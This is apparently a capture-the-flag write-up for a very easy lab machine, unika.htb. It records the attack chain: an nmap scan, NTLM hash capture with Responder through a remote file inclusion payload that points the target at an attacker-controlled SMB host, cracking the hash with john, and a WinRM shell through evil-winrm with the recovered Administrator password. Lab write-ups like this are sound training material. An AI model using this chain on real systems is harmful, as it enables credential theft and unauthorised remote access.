# 1. Overview
**Target:** `unika.htb`  
**Difficulty:** Very Easy  
**Primary focus:** Network-based credential harvesting and remote code inclusion → NTLM capture/relay to gain RCE / shell (WinRM).  
**Services observed:** Apache (HTTP) on 80/tcp, WinRM on 5985/tcp.  
**High-level summary:** I discovered a web application vulnerable to remote file inclusion (RFI). By hosting a file and poisoning name resolution on the target LAN with Responder, I captured an NTLM challenge/response hash, cracked it to recover credentials, and used those credentials to obtain a WinRM shell as Administrator. Post‑access enumeration produced the Administrator (root) flag.

---

# 2. Steps

## Reconnaissance
### Nmap scan
- [nmap scan](./evidences/nmap.txt)  
- `nmap -sV unika.htb -oN nmap.txt`  
- Apache web server on port `80/tcp`  
- WinRM server on port `5985/tcp`

---

## Resource Development
### Responder tool
- [NTLM hash](./evidences/ntlm_hash.png)  
- `responder -I tun0`  
- Listening on the interface connected to the target LAN for LLMNR/NetBIOS name resolution requests so we can capture usernames and NTLM challenge/response hashes (MD4).

---

## Initial Access
### Remote File Intrusion (RFI)
- [RFI command](./evidences/remote_file_intrusion.png)  
- `index.php?page=//10.10.14.78/test`  
- Responder logs are stored in `/usr/share/responder/log`  
- The captured hash from the log was saved to: [NTLM hash](./evidences/hash.txt)

### Hash Crack
- [NTLM hash cracked](./evidences/hash_cracking.png)  
- `john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-75.txt ./evidences/hash.txt`

### WinRM Access
- [WinRM shell access](./evidences/WinRM_access.png)  
- `evil-winrm -i unika.htb -u Administrator -p badminton`

---

## Privilege Escalation
- [root flag](./evidences/root_flag.png)  
- `cat C:\Users\mike\Desktop\flag.txt`
